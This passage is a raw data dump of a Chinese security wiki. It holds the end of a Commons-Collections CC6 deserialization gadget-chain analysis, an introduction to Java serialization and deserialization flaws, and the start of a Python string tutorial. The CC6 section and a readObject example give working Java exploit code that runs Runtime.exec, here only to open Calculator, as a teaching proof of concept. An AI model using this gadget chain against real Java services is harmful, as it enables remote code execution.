lazyMap.remove("aaa");\n\n  Field factoryField = LazyMap.class.getDeclaredField("factory");\n  factoryField.setAccessible(true);\n  factoryField.set(lazyMap,chainedTransformer);\n\n\n  serialize(hashMap);\n  deserialize();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n',normalizedContent:'# cc6 利用链分析\n\n\n# 背景\n\n我们在分析cc1时使用的jdk版本时8u65，如果使用高于8u71版本的jdk则无法利用cc1链。这是因为在高版本的jdk中改进了annotationinvocationhandler的readobject方法的利用逻辑。在ysoserial中，cc6解决了高版本jdk无法使用的问题，是ysoserial比较通用和全能的一条链。但是这条利用链还是需要依靠commonscollections3.2.2以下的版本。\n\n\n# 利用链分析\n\n我们在cc1中分析过，ysoserial中使用的lazymap和我们使用的transformedmap有一点区别，lazymap使用的是annotationinvokerhandler的invoke方法调用其set方法。而要执行invoke方法需要包装一个动态代理对象。而本次的cc6链同样是调用lazymap实现的，后面的都是一致的，只是入口到set方法位置不一致。下面是cc6的调用链。\n\n\tgadget chain:\n\t    java.io.objectinputstream.readobject()\n            java.util.hashset.readobject()\n                java.util.hashmap.put()\n                java.util.hashmap.hash()\n                    org.apache.commons.collections.keyvalue.tiedmapentry.hashcode()\n                    org.apache.commons.collections.keyvalue.tiedmapentry.getvalue()\n                        org.apache.commons.collections.map.lazymap.get()\n                            org.apache.commons.collections.functors.chainedtransformer.transform()\n                            org.apache.commons.collections.functors.invokertransformer.transform()\n                            java.lang.reflect.method.invoke()\n                                java.lang.runtime.exec()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n从lazymap的get开始，向上寻找哪里调用了get方法，并且我们参数可控。根据这条gadget chain，我们找到了tiedmapentry.getvalue方法。在getvalue中调用了map的get方法。而map是可以通过有参构造传入的。\n\n\n\n我们尝试构造一下：\n\npackage com.pwddd.cc6;\n\nimport org.apache.commons.collections.transformer;\nimport org.apache.commons.collections.functors.chainedtransformer;\nimport org.apache.commons.collections.functors.constanttransformer;\nimport org.apache.commons.collections.functors.invokertransformer;\nimport org.apache.commons.collections.keyvalue.tiedmapentry;\nimport org.apache.commons.collections.map.lazymap;\n\nimport java.util.calendar;\nimport java.util.hashmap;\nimport java.util.map;\n\npublic class cc6 {\n    public static void main(string[] args) {\n\n        // 1. chains\n        transformer[] transformers = new transformer[]{\n                new constanttransformer(runtime.class),\n                new invokertransformer(\n                        "getmethod",\n                        new class[]{string.class,class[].class},\n                        new object[]{"getruntime",null}\n                ),\n                new invokertransformer(\n                        "invoke",\n                        new class[]{object.class, object[].class},\n                        new object[]{null, null}\n                ),\n                new invokertransformer(\n                        "exec",\n                        new class[]{string.class},\n                        new object[]{"/system/applications/calculator.app/contents/macos/calculator"}\n                )\n        };\n\n        chainedtransformer chainedtransformer = new chainedtransformer(transformers);\n\n        hashmap<object, object> map = new hashmap<>();\n        map lazymap = lazymap.decorate(map, chainedtransformer);\n        // lazymap.get("bbb");\n        tiedmapentry tiedmapentry = new tiedmapentry(lazymap, "aaa");\n        tiedmapentry.getvalue();\n        \n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n上面的代码基本都是类似的，后面使用tiedmapentity封装了lazymap，并调用getvalue方法。能够执行相应的结果。\n\n\n\n既然到tiedmapentity这一步能够执行，就需要继续寻找哪里调用了getvalue方法。在tiedmapentity中的hashcode方法中调用了getvalue方法。hashcode方法我们已经很熟悉了，在urldns中，也是利用了hashmap的hashcode方法。\n\n\n\n那么我再次尝试调用一下：\n\ntiedmapentry tiedmapentry = new tiedmapentry(lazymap, "aaa");\n//        tiedmapentry.getvalue();\ntiedmapentry.hashcode();\n\n\n1\n2\n3\n\n\n发现是可以的，那么哪里又调用了hashcode方法，并且调用hashcode的对象我们可以控制呢？\n\n在urldns中，我们知道hashmap中的hash方法会对我们传入的key做hash，会掉用key的hashcode方法。因此只需要将tiedmapentity作为hashmap的key即可。\n\nhashmap<object, object> hashmap = new hashmap<>();\nhashmap.put(tiedmapentry,"bbb");\n\n\n1\n2\n\n\n在put时也会弹出计算器，这是因为在hashmap的put方法中也会计算key的hash值，我们可以先不将我们的chainedtransformer封装进去，这样就无法调用了。\n\nmap lazymap = lazymap.decorate(map, new constanttransformer(1));\n\nclass<lazymap> clazz = lazymap.class;\nfield factory = clazz.getdeclaredfield("factory");\nfactory.setaccessible(true);\nfactory.set(lazymap,transformers);\n\n\n1\n2\n3\n4\n5\n6\n\n\n我们尝试将生成的对象序列化之后，再反序列化。仍然无法弹出计算器。我们跟踪一下代码看一下：\n\n\n\n我们看到当执行到这里的时候，map中已经有key为aaa的数据了，那么就不会执行下面的transform方法。因此我们需要把aaa的key移除，这样在反序列化的时候，map里面没有对应的key才可以执行。\n\n完整的代码如下：\n\npublic static void main(string[] args) throws exception {\n\n  // 1. chains\n  transformer[] transformers = new transformer[]{\n    new constanttransformer(runtime.class),\n    new invokertransformer(\n      "getmethod",\n      new class[]{string.class,class[].class},\n      new object[]{"getruntime",null}\n    ),\n    new invokertransformer(\n      "invoke",\n      new class[]{object.class, object[].class},\n      new object[]{null, null}\n    ),\n    new invokertransformer(\n      "exec",\n      new class[]{string.class},\n      new object[]{"/system/applications/calculator.app/contents/macos/calculator"}\n    )\n  };\n\n  chainedtransformer chainedtransformer = new chainedtransformer(transformers);\n\n  hashmap<object, object> map = new hashmap<>();\n  map lazymap = lazymap.decorate(map, new constanttransformer(1));\n\n  tiedmapentry tiedmapentry = new tiedmapentry(lazymap, "aaa");\n\n  hashmap<object, object> hashmap = new hashmap<>();\n  hashmap.put(tiedmapentry, "bbb");\n  lazymap.remove("aaa");\n\n  field factoryfield = lazymap.class.getdeclaredfield("factory");\n  factoryfield.setaccessible(true);\n  factoryfield.set(lazymap,chainedtransformer);\n\n\n  serialize(hashmap);\n  deserialize();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n',charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"反序列化漏洞原理 - 反序列化",frontmatter:{title:"反序列化漏洞原理 - 反序列化",date:"2022-05-25T00:00:00.000Z",permalink:"/sec/vuln/deserialization/serialization",author:{name:"p0jo",link:"https://wiki.pwddd.com"},titleTag:"原创",categories:["漏洞原理","反序列化漏洞"],tags:["反序列化","漏洞原理"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/201.%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/2010.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/04.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html",relativePath:"02.安全/201.漏洞原理/2010.反序列化漏洞/04.反序列化原理-反序列化.md",key:"v-47cbce6b",path:"/sec/vuln/deserialization/serialization/",headers:[{level:2,title:"什么是反序列化",slug:"什么是反序列化",normalizedTitle:"什么是反序列化",charIndex:74},{level:2,title:"Java反序列化",slug:"java反序列化",normalizedTitle:"java反序列化",charIndex:377},{level:3,title:"序列化过程",slug:"序列化过程",normalizedTitle:"序列化过程",charIndex:515},{level:3,title:"反序列化过程",slug:"反序列化过程",normalizedTitle:"反序列化过程",charIndex:5258},{level:2,title:"反序列化漏洞",slug:"反序列化漏洞",normalizedTitle:"反序列化漏洞",charIndex:2}],headersStr:"什么是反序列化 Java反序列化 序列化过程 反序列化过程 反序列化漏洞",content:'# 反序列化漏洞原理 - 反序列化\n\n> 前面说过反序列化的基础反射相关的知识，要了解反序列化漏洞还必须知道Java的反序列化相关的内容。\n\n\n# 什么是反序列化\n\n要想知道什么是反序列化，首先需要了解何为序列化。没有接触过编程语言的可能对这个词不熟悉。我们要将数据保存、传输，就需要用到序列化技术。所谓序列化，将对象转化为能够在硬盘上、数据库中保存、在网络上传输的一串序列。常见的将对象保存到文件、数据库都算是序列化。如果存在两个系统，A系统需要B系统中的某个对象，那么对象不可能直接利用网络发送，于是B系统将数据序列化，然后发送给A，A收到序列化的数据之后，再通过反序列化，获得原来的对象。简单来讲，序列化就是将对象转化成可在网络传输、可保存的序列的过程，反序列化就是将序列化的串转化为原来的对象的过程 Json其实也是一种序列化的操作。我们下面介绍Java反序列化的过程。\n\n\n# Java反序列化\n\nJava中存在一个IO流的概念，不管是文件操作还是序列化反序列化都是通过IO流完成的。所谓IO流可以简单理解为一个水管，这部分不了解的可以看看Java基础中关于IO流的部分。我们这里要说的是对象流（输入、输出）。\n\n\n# 序列化过程\n\nJava中序列化文件使用到的是ObjectOutputStream。很好理解，就是将Object对象输出。那么输出到哪呢？其实有很多种选择，可以输出到文件，也可以输出到byte[]数组中。只要用 水管套水管就好了。下面是将Student对象序列化到文件的过程：\n\nStudent对象定义为如下：\n\npackage com.pwddd.basic;\n\n\npublic class Student {\n  private String name;\n  private String password;\n  private int age;\n\n\n  public void sayHello(){\n    System.out.println("helloworld："+name);\n  }\n  private void sayFuck(){\n    System.out.println("fuck："+name);\n  }\n\n\n  @Override\n  public String toString() {\n    return "Student{" +\n      "name=\'" + name + \'\\\'\' +\n      ", password=\'" + password + \'\\\'\' +\n      ", age=" + age +\n      \'}\';\n  }\n\n  public Student() {\n  }\n\n  public Student(String name, String password, int age) {\n    this.name = name;\n    this.password = password;\n    this.age = age;\n  }\n\n  public String getName() {\n    return name;\n  }\n\n  public void setName(String name) {\n    this.name = name;\n  }\n\n  public String getPassword() {\n    return password;\n  }\n\n  public void setPassword(String password) {\n    this.password = password;\n  }\n\n  public int getAge() {\n    return age;\n  }\n\n  public void setAge(int age) {\n    this.age = age;\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n\n\npublic static void main(String[] args) throws IOException {\n  Student student = new Student("zhangsan", "123456", 12);\n  FileOutputStream fos = new FileOutputStream("./student.ser");\n  ObjectOutputStream oos = new ObjectOutputStream(fos);\n  oos.writeObject(student);\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n当运行这段序列化的代码时，会报错。这是因为在Java中，一个对象想要被序列化，需要实现序列化的接口：implements Serializable。并且需要生成一个serialVersionUID。\n\n\n\n这个serialVersionUID是用来辅助对象的序列化与反序列化的，原则上序列化后的数据当中的serialVersionUID与当前类当中的serialVersionUID一致，那么该对象才能被反序列化成功。这个serialVersionUID的详细的工作机制是：在序列化的时候系统将serialVersionUID写入到序列化的文件中去，当反序列化的时候系统会先去检测文件中的serialVersionUID是否跟当前的文件的serialVersionUID是否一致，如果一致则反序列化成功，否则就说明当前类跟序列化后的类发生了变化，比如是成员变量的数量或者是类型发生了变化，那么在反序列化时就会发生crash，并且回报出错误：\n\njava.io.InvalidClassException: User; local class incompatible: stream\nclassdesc serialVersionUID = -1451587475819212328, local class\nserialVersionUID = -3946714849072033140at\njava.io.ObjectStreamClass.initNonProxy(ObjectStreamClass.java:699)at\njava.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1885)at\njava.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1751)at\njava.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2042)at\njava.io.ObjectInputStream.readObject0(ObjectInputStream.java:1573)at\njava.io.ObjectInputStream.readObject(ObjectInputStream.java:431)at\nMain.readUser(Main.java:32)at Main.main(Main.java:10)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n重新运行这段代码，会发现生成了一个序列化的文件。该文件内容无法用文本工具打开，可以使用专门的工具读取信息：\n\nhttps://github.com/NickstaDB/SerializationDumper\n\n\n\n使用工具获取文件信息：\n\nSTREAM_MAGIC - 0xac ed\nSTREAM_VERSION - 0x00 05\nContents\n  TC_OBJECT - 0x73\n    TC_CLASSDESC - 0x72\n      className\n        Length - 23 - 0x00 17\n        Value - com.pwddd.basic.Student - 0x636f6d2e70776464642e62617369632e53747564656e74\n      serialVersionUID - 0xc0 01 30 4c 21 c0 5e b7\n      newHandle 0x00 7e 00 00\n      classDescFlags - 0x02 - SC_SERIALIZABLE\n      fieldCount - 3 - 0x00 03\n      Fields\n        0:\n          Int - I - 0x49\n          fieldName\n            Length - 3 - 0x00 03\n            Value - age - 0x616765\n        1:\n          Object - L - 0x4c\n          fieldName\n            Length - 4 - 0x00 04\n            Value - name - 0x6e616d65\n          className1\n            TC_STRING - 0x74\n              newHandle 0x00 7e 00 01\n              Length - 18 - 0x00 12\n              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b\n        2:\n          Object - L - 0x4c\n          fieldName\n            Length - 8 - 0x00 08\n            Value - password - 0x70617373776f7264\n          className1\n            TC_REFERENCE - 0x71\n              Handle - 8257537 - 0x00 7e 00 01\n      classAnnotations\n        TC_ENDBLOCKDATA - 0x78\n      superClassDesc\n        TC_NULL - 0x70\n    newHandle 0x00 7e 00 02\n    classdata\n      com.pwddd.basic.Student\n        values\n          age\n            (int)12 - 0x00 00 00 0c\n          name\n            (object)\n              TC_STRING - 0x74\n                newHandle 0x00 7e 00 03\n                Length - 8 - 0x00 08\n                Value - zhangsan - 0x7a68616e6773616e\n          password\n            (object)\n              TC_STRING - 0x74\n                newHandle 0x00 7e 00 04\n                Length - 6 - 0x00 06\n                Value - 123456 - 0x313233343536\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n\n\n可以看到文件的头部是aced0005，这是很多IDS告警的特征之一。\n\n\n# 反序列化过程\n\n反序列化是将序列化生成的文件或者序列还原为对象的过程。如下的代码是反序列化的过程：\n\nFileInputStream fis = new FileInputStream("./student.ser");\nObjectInputStream ois = new ObjectInputStream(fis);\nStudent student1 = (Student) ois.readObject();\nSystem.out.println(student1); //Student{name=\'zhangsan\', password=\'123456\', age=12}\n\n\n1\n2\n3\n4\n\n\n\n# 反序列化漏洞\n\n通过跟踪Java反序列化的代码，我们发现，当我们去序列化和反序列化一个对象时，如果我们的对象存在一个readObject和writeObject方法，那么在序列化和反序列化时，就会执行这个方法。如下所示：\n\n调用writeObject：\n\nwriteObject:70, Student (com.pwddd.basic)\ninvoke0:-1, NativeMethodAccessorImpl (sun.reflect)\ninvoke:62, NativeMethodAccessorImpl (sun.reflect)\ninvoke:43, DelegatingMethodAccessorImpl (sun.reflect)\ninvoke:498, Method (java.lang.reflect)\ninvokeWriteObject:1155, ObjectStreamClass (java.io)\nwriteSerialData:1496, ObjectOutputStream (java.io)\nwriteOrdinaryObject:1432, ObjectOutputStream (java.io)\nwriteObject0:1178, ObjectOutputStream (java.io)\nwriteObject:348, ObjectOutputStream (java.io)\nmain:10, Serialization (com.pwddd.basic)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n调用readObject：\n\nreadObject:66, Student (com.pwddd.basic)\ninvoke0:-1, NativeMethodAccessorImpl (sun.reflect)\ninvoke:62, NativeMethodAccessorImpl (sun.reflect)\ninvoke:43, DelegatingMethodAccessorImpl (sun.reflect)\ninvoke:498, Method (java.lang.reflect)\ninvokeReadObject:1185, ObjectStreamClass (java.io)\nreadSerialData:2319, ObjectInputStream (java.io)\nreadOrdinaryObject:2210, ObjectInputStream (java.io)\nreadObject0:1690, ObjectInputStream (java.io)\nreadObject:508, ObjectInputStream (java.io)\nreadObject:466, ObjectInputStream (java.io)\nmain:13, Serialization (com.pwddd.basic)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n那么，如果我们反序列化的对象有readObject方法，并且在该方法中有一个恶意的代码，在反序列化的时候就会执行这一串恶意代码。\n\nprivate void readObject(ObjectInputStream objectInputStream) throws IOException {\n  Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");\n}\n\n\n1\n2\n3\n\n\n虽然这种代码基本不会出现，但是我们可以通过层层嵌套等方式，达到我们的目的。\n\n----------------------------------------\n\n先写到这，总觉得意犹未尽。但是已经不知道写什么了。',normalizedContent:'# 反序列化漏洞原理 - 反序列化\n\n> 前面说过反序列化的基础反射相关的知识，要了解反序列化漏洞还必须知道java的反序列化相关的内容。\n\n\n# 什么是反序列化\n\n要想知道什么是反序列化，首先需要了解何为序列化。没有接触过编程语言的可能对这个词不熟悉。我们要将数据保存、传输，就需要用到序列化技术。所谓序列化，将对象转化为能够在硬盘上、数据库中保存、在网络上传输的一串序列。常见的将对象保存到文件、数据库都算是序列化。如果存在两个系统，a系统需要b系统中的某个对象，那么对象不可能直接利用网络发送，于是b系统将数据序列化，然后发送给a，a收到序列化的数据之后，再通过反序列化，获得原来的对象。简单来讲，序列化就是将对象转化成可在网络传输、可保存的序列的过程，反序列化就是将序列化的串转化为原来的对象的过程 json其实也是一种序列化的操作。我们下面介绍java反序列化的过程。\n\n\n# java反序列化\n\njava中存在一个io流的概念，不管是文件操作还是序列化反序列化都是通过io流完成的。所谓io流可以简单理解为一个水管，这部分不了解的可以看看java基础中关于io流的部分。我们这里要说的是对象流（输入、输出）。\n\n\n# 序列化过程\n\njava中序列化文件使用到的是objectoutputstream。很好理解，就是将object对象输出。那么输出到哪呢？其实有很多种选择，可以输出到文件，也可以输出到byte[]数组中。只要用 水管套水管就好了。下面是将student对象序列化到文件的过程：\n\nstudent对象定义为如下：\n\npackage com.pwddd.basic;\n\n\npublic class student {\n  private string name;\n  private string password;\n  private int age;\n\n\n  public void sayhello(){\n    system.out.println("helloworld："+name);\n  }\n  private void sayfuck(){\n    system.out.println("fuck："+name);\n  }\n\n\n  @override\n  public string tostring() {\n    return "student{" +\n      "name=\'" + name + \'\\\'\' +\n      ", password=\'" + password + \'\\\'\' +\n      ", age=" + age +\n      \'}\';\n  }\n\n  public student() {\n  }\n\n  public student(string name, string password, int age) {\n    this.name = name;\n    this.password = password;\n    this.age = age;\n  }\n\n  public string getname() {\n    return name;\n  }\n\n  public void setname(string name) {\n    this.name = name;\n  }\n\n  public string getpassword() {\n    return password;\n  }\n\n  public void setpassword(string password) {\n    this.password = password;\n  }\n\n  public int getage() {\n    return age;\n  }\n\n  public void setage(int age) {\n    this.age = age;\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n\n\npublic static void main(string[] args) throws ioexception {\n  student student = new student("zhangsan", "123456", 12);\n  fileoutputstream fos = new fileoutputstream("./student.ser");\n  objectoutputstream oos = new objectoutputstream(fos);\n  oos.writeobject(student);\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n当运行这段序列化的代码时，会报错。这是因为在java中，一个对象想要被序列化，需要实现序列化的接口：implements serializable。并且需要生成一个serialversionuid。\n\n\n\n这个serialversionuid是用来辅助对象的序列化与反序列化的，原则上序列化后的数据当中的serialversionuid与当前类当中的serialversionuid一致，那么该对象才能被反序列化成功。这个serialversionuid的详细的工作机制是：在序列化的时候系统将serialversionuid写入到序列化的文件中去，当反序列化的时候系统会先去检测文件中的serialversionuid是否跟当前的文件的serialversionuid是否一致，如果一致则反序列化成功，否则就说明当前类跟序列化后的类发生了变化，比如是成员变量的数量或者是类型发生了变化，那么在反序列化时就会发生crash，并且回报出错误：\n\njava.io.invalidclassexception: user; local class incompatible: stream\nclassdesc serialversionuid = -1451587475819212328, local class\nserialversionuid = -3946714849072033140at\njava.io.objectstreamclass.initnonproxy(objectstreamclass.java:699)at\njava.io.objectinputstream.readnonproxydesc(objectinputstream.java:1885)at\njava.io.objectinputstream.readclassdesc(objectinputstream.java:1751)at\njava.io.objectinputstream.readordinaryobject(objectinputstream.java:2042)at\njava.io.objectinputstream.readobject0(objectinputstream.java:1573)at\njava.io.objectinputstream.readobject(objectinputstream.java:431)at\nmain.readuser(main.java:32)at main.main(main.java:10)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n重新运行这段代码，会发现生成了一个序列化的文件。该文件内容无法用文本工具打开，可以使用专门的工具读取信息：\n\nhttps://github.com/nickstadb/serializationdumper\n\n\n\n使用工具获取文件信息：\n\nstream_magic - 0xac ed\nstream_version - 0x00 05\ncontents\n  tc_object - 0x73\n    tc_classdesc - 0x72\n      classname\n        length - 23 - 0x00 17\n        value - com.pwddd.basic.student - 0x636f6d2e70776464642e62617369632e53747564656e74\n      serialversionuid - 0xc0 01 30 4c 21 c0 5e b7\n      newhandle 0x00 7e 00 00\n      classdescflags - 0x02 - sc_serializable\n      fieldcount - 3 - 0x00 03\n      fields\n        0:\n          int - i - 0x49\n          fieldname\n            length - 3 - 0x00 03\n            value - age - 0x616765\n        1:\n          object - l - 0x4c\n          fieldname\n            length - 4 - 0x00 04\n            value - name - 0x6e616d65\n          classname1\n            tc_string - 0x74\n              newhandle 0x00 7e 00 01\n              length - 18 - 0x00 12\n              value - ljava/lang/string; - 0x4c6a6176612f6c616e672f537472696e673b\n        2:\n          object - l - 0x4c\n          fieldname\n            length - 8 - 0x00 08\n            value - password - 0x70617373776f7264\n          classname1\n            tc_reference - 0x71\n              handle - 8257537 - 0x00 7e 00 01\n      classannotations\n        tc_endblockdata - 0x78\n      superclassdesc\n        tc_null - 0x70\n    newhandle 0x00 7e 00 02\n    classdata\n      com.pwddd.basic.student\n        values\n          age\n            (int)12 - 0x00 00 00 0c\n          name\n            (object)\n              tc_string - 0x74\n                newhandle 0x00 7e 00 03\n                length - 8 - 0x00 08\n                value - zhangsan - 0x7a68616e6773616e\n          password\n            (object)\n              tc_string - 0x74\n                newhandle 0x00 7e 00 04\n                length - 6 - 0x00 06\n                value - 123456 - 0x313233343536\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n\n\n可以看到文件的头部是aced0005，这是很多ids告警的特征之一。\n\n\n# 反序列化过程\n\n反序列化是将序列化生成的文件或者序列还原为对象的过程。如下的代码是反序列化的过程：\n\nfileinputstream fis = new fileinputstream("./student.ser");\nobjectinputstream ois = new objectinputstream(fis);\nstudent student1 = (student) ois.readobject();\nsystem.out.println(student1); //student{name=\'zhangsan\', password=\'123456\', age=12}\n\n\n1\n2\n3\n4\n\n\n\n# 反序列化漏洞\n\n通过跟踪java反序列化的代码，我们发现，当我们去序列化和反序列化一个对象时，如果我们的对象存在一个readobject和writeobject方法，那么在序列化和反序列化时，就会执行这个方法。如下所示：\n\n调用writeobject：\n\nwriteobject:70, student (com.pwddd.basic)\ninvoke0:-1, nativemethodaccessorimpl (sun.reflect)\ninvoke:62, nativemethodaccessorimpl (sun.reflect)\ninvoke:43, delegatingmethodaccessorimpl (sun.reflect)\ninvoke:498, method (java.lang.reflect)\ninvokewriteobject:1155, objectstreamclass (java.io)\nwriteserialdata:1496, objectoutputstream (java.io)\nwriteordinaryobject:1432, objectoutputstream (java.io)\nwriteobject0:1178, objectoutputstream (java.io)\nwriteobject:348, objectoutputstream (java.io)\nmain:10, serialization (com.pwddd.basic)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n调用readobject：\n\nreadobject:66, student (com.pwddd.basic)\ninvoke0:-1, nativemethodaccessorimpl (sun.reflect)\ninvoke:62, nativemethodaccessorimpl (sun.reflect)\ninvoke:43, delegatingmethodaccessorimpl (sun.reflect)\ninvoke:498, method (java.lang.reflect)\ninvokereadobject:1185, objectstreamclass (java.io)\nreadserialdata:2319, objectinputstream (java.io)\nreadordinaryobject:2210, objectinputstream (java.io)\nreadobject0:1690, objectinputstream (java.io)\nreadobject:508, objectinputstream (java.io)\nreadobject:466, objectinputstream (java.io)\nmain:13, serialization (com.pwddd.basic)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n那么，如果我们反序列化的对象有readobject方法，并且在该方法中有一个恶意的代码，在反序列化的时候就会执行这一串恶意代码。\n\nprivate void readobject(objectinputstream objectinputstream) throws ioexception {\n  runtime.getruntime().exec("/system/applications/calculator.app/contents/macos/calculator");\n}\n\n\n1\n2\n3\n\n\n虽然这种代码基本不会出现，但是我们可以通过层层嵌套等方式，达到我们的目的。\n\n----------------------------------------\n\n先写到这，总觉得意犹未尽。但是已经不知道写什么了。',charsets:{cjk:!0},lastUpdated:"2022/05/25, 13:42:15",lastUpdatedTimestamp:1653486135e3},{title:"Python字符串的那些事",frontmatter:{title:"Python字符串的那些事",date:"2022-03-22T00:00:00.000Z",permalink:"/sec/dev/python/pystring",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["安全开发","Python"],tags:["Python"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/202.%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/2020.Python/00.Python%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B.html",relativePath:"02.安全/202.安全开发/2020.Python/00.Python字符串的那些事.md",key:"v-56606b1e",path:"/sec/dev/python/pystring/",headers:[{level:2,title:"创建一个字符串",slug:"创建一个字符串",normalizedTitle:"创建一个字符串",charIndex:92},{level:2,title:"操作字符串的方法们",slug:"操作字符串的方法们",normalizedTitle:"操作字符串的方法们",charIndex:1420},{level:3,title:"str() 将数字转化为字符串",slug:"str-将数字转化为字符串",normalizedTitle:"str() 将数字转化为字符串",charIndex:1434},{level:3,title:"[] 提取字符串和字符串切片",slug:"提取字符串和字符串切片",normalizedTitle:"[] 提取字符串和字符串切片",charIndex:1775},{level:3,title:"字符串切割和合并",slug:"字符串切割和合并",normalizedTitle:"字符串切割和合并",charIndex:2644},{level:3,title:"字符串比较",slug:"字符串比较",normalizedTitle:"字符串比较",charIndex:2973},{level:3,title:"字符串查找",slug:"字符串查找",normalizedTitle:"字符串查找",charIndex:3364},{level:3,title:"去除首尾信息",slug:"去除首尾信息",normalizedTitle:"去除首尾信息",charIndex:3902},{level:3,title:"大小写转换",slug:"大小写转换",normalizedTitle:"大小写转换",charIndex:4112},{level:3,title:"字符串格式",slug:"字符串格式",normalizedTitle:"字符串格式",charIndex:4555},{level:3,title:"可变字符串",slug:"可变字符串",normalizedTitle:"可变字符串",charIndex:5712}],excerpt:'<h1 id="python字符串的那些事"><a class="header-anchor" href="#python字符串的那些事">#</a> Python字符串的那些事</h1>\n<blockquote>\n<p>怎么说呢。。。Python的语法糖真的是太多了，字符串操作的各种方法简直是秀了我一脸，记也记不住。找个地方写下来吧，好记性不如烂笔头嘛。</p>\n</blockquote>\n',headersStr:"创建一个字符串 操作字符串的方法们 str() 将数字转化为字符串 [] 提取字符串和字符串切片 字符串切割和合并 字符串比较 字符串查找 去除首尾信息 大小写转换 字符串格式 可变字符串",content:'# Python字符串的那些事\n\n> 怎么说呢。。。Python的语法糖真的是太多了，字符串操作的各种方法简直是秀了我一脸，记也记不住。找个地方写下来吧，好记性不如烂笔头嘛。\n\n\n# 创建一个字符串\n\n字符串应该是在学习一门编程语言时最先接触到的东西，“helloworld”就是一个字符串。各个语言中的字符串有所差异，在Python中，字符串的本质就是字符序列。Python中不支持单个字符的类型，比如像\'A\',在Python中也是作为一个字符串使用的。\n\n在Python3中，字符串默认使用16位的Unicode编码，使用ord和chr函数，可以将字符串和编码做转换。、\n\nprint(chr(65))  # A\nprint(ord(\'A\')) # 65\n\n\n1\n2\n\n\n我们可以使用 单引号、双引号创建字符串。使用单引号或双引号嵌套创建的字符串中可以包含另一种引号，起到了转义引号的作用。同时，使用三个引号开始创建字符串，可以保留字符串的格式，这种方式也经常作为多行注释使用。\n\nstr = \'"hello",world\'\nprint(str)  # "hello",world\n\nstr = \'hello\\nworld\'\nprint(str)  # hello 换行 world\n\nstr = "hello\\nworld"\nprint(str) #"hello",world\n\nstr = """\n    public static void main(String[] args){\n        System.out.Println("hello world!");    \n    }\n"""\n\nprint(str)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n如果要创建一个空的字符串，只需要在引号中不填写任何内容就可以了，这在许多其他的编程语言中也是一样的。len(str)用于获取字符串的长度。\n\nstr = \'\'\nprint(len(str))  # 